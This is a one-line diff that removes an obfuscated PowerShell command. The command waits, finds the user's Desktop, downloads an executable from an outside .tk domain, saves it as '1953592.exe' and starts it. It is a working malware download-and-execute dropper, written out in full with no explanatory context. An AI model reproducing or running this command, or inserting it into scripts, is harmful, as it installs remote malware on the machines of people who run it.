@@ -1,1 +1,0 @@
-$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDeRpaTh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('https://asianjunction.tk/topindex','$Des\1953592.exe');&'Start-Process' $Des\1953592.exe
